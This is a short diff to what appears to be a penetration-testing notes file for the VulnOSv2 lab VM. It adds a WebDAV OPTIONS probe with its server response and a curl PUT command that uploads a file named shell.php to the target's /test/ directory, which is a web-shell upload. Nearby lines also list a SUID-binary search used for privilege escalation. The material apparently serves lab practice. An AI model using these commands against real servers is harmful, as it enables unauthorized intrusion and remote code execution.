@@ -2,6 +2,18 @@ sed -i 's/\r//' filename
 
 qemu-img convert -f vdi -O vmdk VulnOSv2.vdi VulnOSv2.vmdk
 
+curl --head -X OPTIONS 192.168.2.4/test/
+HTTP/1.1 200 OK
+DAV: 1,2
+MS-Author-Via: DAV
+Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
+Allow: OPTIONS, GET, HEAD, POST
+Content-Length: 0
+Date: Thu, 15 Jun 2017 16:32:35 GMT
+Server: lighttpd/1.4.28
+
+curl -v -X PUT -H "Expect: " 192.168.2.4/test/shell.php -d@shell.php
+
 find SUID binaries
 find / -perm -u=s -type f 2>/dev/null (SUID3ENUM)
 
